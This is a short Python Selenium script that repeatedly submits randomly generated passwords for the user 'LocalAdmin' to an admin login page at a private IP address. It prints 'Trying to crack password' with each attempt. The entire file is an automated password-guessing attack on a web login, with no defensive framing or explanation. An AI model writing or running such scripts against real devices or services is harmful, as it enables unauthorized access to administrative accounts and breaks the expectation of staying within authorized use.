
import string
import random
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


driver = webdriver.Firefox()
driver.get("https://192.168.2.55/admin/index.html")

user_name = "LocalAdmin"

def get_random_alphanumeric_string(length):
    letters_and_digits = string.ascii_letters + string.digits

    result_str = ''.join((random.choice(letters_and_digits) for i in range(length)))
    return result_str

for i in range(20):
    print("Trying to crack password: Attempt: ", i + 1)
    passwd = get_random_alphanumeric_string(random.randint(5,15))
    passwd = passwd + "725"
    WebDriverWait(driver, 20).until(EC.frame_to_be_available_and_switch_to_it((By.NAME, 'interfaces')))
    try:
        elem = driver.find_element_by_xpath('//*[@id="uname"]')
        elem.send_keys(user_name)
        elem = driver.find_element_by_xpath('//*[@id="passwd"]')
        elem.send_keys(passwd)

        driver.find_element_by_xpath('//*[@id="submitbtn"]').click()
        driver.switch_to.default_content();
        WebDriverWait(driver, 20).until(EC.staleness_of(elem))
    except:
        time.sleep(2)
        continue


